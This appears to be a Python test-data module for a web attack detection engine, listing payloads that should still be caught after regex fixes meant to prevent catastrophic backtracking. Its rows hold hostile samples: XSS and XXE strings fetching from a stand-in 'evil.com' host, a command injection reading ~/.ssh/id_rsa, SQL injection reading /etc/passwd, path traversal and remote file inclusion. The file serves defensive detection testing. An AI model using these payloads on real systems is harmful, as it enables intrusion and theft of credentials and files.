"""Embedded-terminator regression rows for the ReDoS engine unit.

Each entry is a pattern where the cheap fix (adding the literal prefix's own
opening character to the negated class) is LINEAR but loses a real attack.
`payload` is detected by `current` and missed by `naive_fix`. Verified by
running both regexes under re.IGNORECASE | re.DOTALL.

`grammar` cites why a real consumer accepts the payload with the terminator
embedded. A follow-up leg re-runs every proof before these rows are folded in.

Consume programmatically:
    from embedded_terminator_rows import ROWS
    for r in ROWS: ...
"""

ROWS: list[dict[str, object]] = [
    {
        "name": "emb_xss_script_lt_attr",
        "idx": 0,
        "category": "xss",
        "payload": b'<script x="<" src="//evil/x.js">alert(1)</script>',
        "current": r"<script[^>]*>[^<]*<\/script\s*>",
        "naive_fix": r"<script[^<>]*>[^<]*<\/script\s*>",
        "grammar": "WHATWG HTML Living Standard 13.2.5.34 attribute-value "
        "(double-quoted) state: every character is appended verbatim except "
        "U+0022, U+0026 and U+0000, so a raw < is legal in a quoted value.",
    },
    {
        "name": "emb_xss_object_lt_attr",
        "idx": 5,
        "category": "xss",
        "payload": b'<object x="<" data="//evil.com/x.swf"></object>',
        "current": r"(?:<object[^>]*>[\s\S]*<\/object\s*>)",
        "naive_fix": r"(?:<object[^<>]*>[\s\S]*<\/object\s*>)",
        "grammar": "Same HTML tokenizer state as emb_xss_script_lt_attr.",
    },
    {
        "name": "emb_xss_embed_lt_attr",
        "idx": 6,
        "category": "xss",
        "payload": b'<embed x="<" src="//evil.com/x.swf"></embed>',
        "current": r"(?:<embed[^>]*>[\s\S]*<\/embed\s*>)",
        "naive_fix": r"(?:<embed[^<>]*>[\s\S]*<\/embed\s*>)",
        "grammar": "Same HTML tokenizer state as emb_xss_script_lt_attr.",
    },
    {
        "name": "emb_xss_applet_lt_attr",
        "idx": 7,
        "category": "xss",
        "payload": b'<applet x="<" code="//evil.com/x.class"></applet>',
        "current": r"(?:<applet[^>]*>[\s\S]*<\/applet\s*>)",
        "naive_fix": r"(?:<applet[^<>]*>[\s\S]*<\/applet\s*>)",
        "grammar": "Same HTML tokenizer state as emb_xss_script_lt_attr.",
    },
    {
        "name": "emb_xss_style_expression_nested_paren",
        "idx": 4,
        "category": "xss",
        "payload": b'<div style="x:expression(String.fromCharCode(97))">',
        "current": r"(?:<[^<>]*style\s*=[\s\"']*[^<>\"']*"
        r"(?:expression|behavior|url)\s*\([^)]*\))",
        "naive_fix": r"(?:<[^<>]*style\s*=[\s\"']*[^<>\"']*"
        r"(?:expression|behavior|url)\s*\([^()]*\))",
        "grammar": "CSS legacy expression() evaluates its argument as an "
        "ECMAScript Arguments production, which permits nested CallExpression, "
        "so a real ( precedes the outer ). CSS Syntax Level 3 4.3.5 gives the "
        "analogous case for url().",
    },
    {
        "name": "emb_sqli_load_file_nested_paren",
        "idx": 15,
        "category": "sqli",
        "payload": b"LOAD_FILE(CONCAT(0x2f6574632f706173737764))",
        "current": r"(?i)(?:LOAD_FILE\s*\([^)]+\))",
        "naive_fix": r"(?i)(?:LOAD_FILE\s*\([^()]+\))",
        "grammar": "MySQL function-call arguments are expr, and expr may itself "
        "be a function call, so nested calls with an embedded ( before the "
        "outer ) are ordinary valid SQL.",
    },
    {
        "name": "emb_dir_traversal_matrix_param_dot",
        "idx": 31,
        "category": "dir_traversal",
        "payload": b"/app/..;jsessionid=ABCDEF0123456789.node1/WEB-INF/web.xml",
        "current": r"\.\.;[^/\\]*[/\\]",
        "naive_fix": r"\.\.;[^/\\.]*[/\\]",
        "grammar": "RFC 3986 3.3: segment = *pchar, pchar includes unreserved, "
        "unreserved includes '.'. Tomcat appends .<jvmRoute> to JSESSIONID for "
        "session affinity, so this is the standard clustered-Tomcat cookie.",
    },
    {
        "name": "emb_cmd_injection_dollar_paren_var",
        "idx": 34,
        "category": "cmd_injection",
        "payload": b";$(cat $HOME/.ssh/id_rsa)",
        "current": r"(?:[;&|]\s*(?:\$\([^)]+\)|\$\{[^}]+\}))",
        "naive_fix": r"(?:[;&|]\s*(?:\$\([^)$]+\)|\$\{[^}]+\}))",
        "grammar": "POSIX 1003.1 command substitution $(command): command is a "
        "compound_list, which routinely contains parameter expansion or a "
        "nested $(...), so a literal $ inside is ordinary.",
    },
    {
        "name": "emb_file_inclusion_multisegment_path",
        "idx": 50,
        "category": "file_inclusion",
        "payload": b"=http://evil.com/a/b/shell.php",
        "current": r"=(?:https?|ftp):\/\/[^\s'\"<>]+\/[^\s'\"<>\/]*"
        r"\.(?:phtml|php[3-5]?|phar|jsp|aspx?|cgi|pl|py|sh|txt|inc)"
        r"(?![a-zA-Z0-9])",
        "naive_fix": r"=(?:https?|ftp):\/\/[^\s'\"<>\/]+\/[^\s'\"<>\/]*"
        r"\.(?:phtml|php[3-5]?|phar|jsp|aspx?|cgi|pl|py|sh|txt|inc)"
        r"(?![a-zA-Z0-9])",
        "grammar": "RFC 3986 3.3: path-abempty = *( '/' segment ), so a URI "
        "path is by definition multi-segment; an RFI target with an "
        "intermediate directory is the ordinary case.",
    },
    {
        "name": "emb_xml_entity_system_literal_lt",
        "idx": 59,
        "category": "xml",
        "payload": b'<!ENTITY xxe SYSTEM "http://evil.com/<x">',
        "current": r"<!(?:ENTITY|DOCTYPE)[^>]+SYSTEM[^>]+>",
        "naive_fix": r"<!(?:ENTITY|DOCTYPE)[^<>]+SYSTEM[^<>]+>",
        "grammar": "XML 1.0 SystemLiteral is any character except the "
        "delimiting quote, so a raw < is legal inside it.",
        "note": "TWO gaps. Fixing gap1 alone leaves gap2 exploitable, because "
        "SYSTEM is a findable literal that repeated prefixes reach even with "
        "gap1 bounded. Gap1 alone is a clean 'none' (XML NameChar excludes <). "
        "Both gaps, or the DoS survives.",
    },
    {
        "name": "emb_xml_doctype_externalid_lt",
        "idx": 61,
        "category": "xml",
        "payload": b'<!DOCTYPE foo SYSTEM "http://evil.com/<x" '
        b'[<!ENTITY xxe SYSTEM "http://evil.com/y">]>',
        "current": r"<!DOCTYPE[^>\[]*\[[\s\S]*?<!ENTITY",
        "naive_fix": r"<!DOCTYPE[^<>\[]*\[[\s\S]*?<!ENTITY",
        "grammar": "Same XML SystemLiteral production, reached through "
        "ExternalID in the DOCTYPE.",
    },
    {
        "name": "emb_template_ssti_hash_brace_string_hash",
        "idx": 81,
        "category": "template",
        "payload": b'#{"a#b".gsub(/x/,"y")}',
        "current": r"#\{\s*[^\}]*(?:@[\w.]+@|\b\w+\s*\(|"
        r"['\"]?\d+['\"]?\s*[*/%+\-]\s*['\"]?\d+['\"]?)[^\}]*\}",
        "naive_fix": r"#\{\s*[^\}#]*(?:@[\w.]+@|\b\w+\s*\(|"
        r"['\"]?\d+['\"]?\s*[*/%+\-]\s*['\"]?\d+['\"]?)[^\}]*\}",
        "grammar": "Ruby double-quoted string: # introduces interpolation only "
        "when followed by {, @ or $; a bare # followed by anything else is an "
        "ordinary literal character.",
        "note": "A nested-interpolation payload does NOT prove this, because "
        "the inner #{1+1} independently satisfies the whole pattern. This "
        "payload has only one #{ so there is no rescuing match position.",
    },
]

SAFE_TO_EXCLUDE: list[dict[str, object]] = [
    {
        "name": "ldap_attr_paren",
        "idx": 51,
        "category": "ldap",
        "current": r"\(\s*[|&]\s*\(\s*[^)]+=[*]",
        "naive_fix": r"\(\s*[|&]\s*\(\s*[^)(]+=[*]",
        "grammar": "RFC 4512 1.4: descr = keystring, keystring = leadkeychar "
        "*keychar over ALPHA / DIGIT / HYPHEN. '(' is categorically outside "
        "the AttributeDescription grammar, so no real attribute name has one.",
        "regression_check": "Both current and fixed still match (|(cn=*) and "
        "(&(uid=*).",
    },
]
